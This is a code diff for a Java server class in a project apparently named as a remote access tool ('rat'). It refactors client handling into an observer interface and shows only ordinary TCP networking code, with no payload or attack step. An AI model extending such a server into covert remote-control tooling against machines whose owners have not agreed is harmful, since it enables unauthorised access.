@@ -1,23 +1,18 @@
 package de.sogomn.rat.server;
 
 import java.net.Socket;
-import java.util.ArrayList;
 
 import de.sogomn.engine.net.TCPServer;
 import de.sogomn.rat.ActiveClient;
-import de.sogomn.rat.IClientObserver;
-import de.sogomn.rat.packet.IPacket;
 
-public final class ActiveServer extends TCPServer implements IClientObserver {
+public final class ActiveServer extends TCPServer {
 	
 	private Thread thread;
 	
-	private ArrayList<ActiveClient> clients;
+	private IServerObserver observer;
 	
 	public ActiveServer(final int port) {
 		super(port);
-		
-		clients = new ArrayList<ActiveClient>();
 	}
 	
 	private ActiveClient acceptClient() {
@@ -41,21 +36,9 @@ public final class ActiveServer extends TCPServer implements IClientObserver {
 			thread = null;
 		}
 		
-		clients.forEach(client -> {
-			client.setObserver(null);
-			client.close();
-		});
-		clients.clear();
-	}
-	
-	@Override
-	public void packetReceived(final ActiveClient client, final IPacket packet) {
-		packet.execute();
-	}
-	
-	@Override
-	public void disconnected(final ActiveClient client) {
-		removeClient(client);
+		if (observer != null) {
+			observer.closed(this);
+		}
 	}
 	
 	public void start() {
@@ -63,8 +46,8 @@ public final class ActiveServer extends TCPServer implements IClientObserver {
 			while (isOpen()) {
 				final ActiveClient client = acceptClient();
 				
-				if (client != null) {
-					addClient(client);
+				if (observer != null && client != null) {
+					observer.clientConnected(this, client);
 				}
 			}
 		};
@@ -74,22 +57,8 @@ public final class ActiveServer extends TCPServer implements IClientObserver {
 		thread.start();
 	}
 	
-	public void broadcast(final IPacket packet) {
-		clients.forEach(client -> {
-			client.sendPacket(packet);
-		});
-	}
-	
-	public void addClient(final ActiveClient client) {
-		client.setObserver(this);
-		clients.add(client);
-		client.start();
-	}
-	
-	public void removeClient(final ActiveClient client) {
-		client.setObserver(null);
-		client.close();
-		clients.remove(client);
+	public void setObserver(final IServerObserver observer) {
+		this.observer = observer;
 	}
 	
 }
